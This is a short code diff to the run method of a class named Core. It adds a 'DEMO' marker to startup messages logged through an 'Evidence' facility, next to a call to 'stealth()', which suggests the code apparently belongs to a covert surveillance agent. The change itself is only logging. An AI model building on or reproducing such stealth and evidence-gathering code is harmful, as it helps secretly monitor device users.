@@ -232,11 +232,14 @@ public final class Core implements Runnable {
      * @return true, if successful
      */
     public void run() {
+        // TODO: messages
+        String demo = Status.self().isDemo() ? " DEMO" : "";
+
         //#ifdef DEBUG
         debug.info("START: " + (new Date())); //$NON-NLS-1$
-        Evidence.info("Start build:" + Cfg.BUILD_ID + " " + Cfg.BUILD_TIMESTAMP); //$NON-NLS-1$ //$NON-NLS-2$
+        Evidence.info("Start" + demo + ",  build: " + Cfg.BUILD_ID + " " + Cfg.BUILD_TIMESTAMP); //$NON-NLS-1$ //$NON-NLS-2$
         //#else
-        Evidence.info(Messages.getString("7.17")); //$NON-NLS-1$
+        Evidence.info(Messages.getString("7.17")+ demo); //$NON-NLS-1$
         //#endif
 
         stealth();
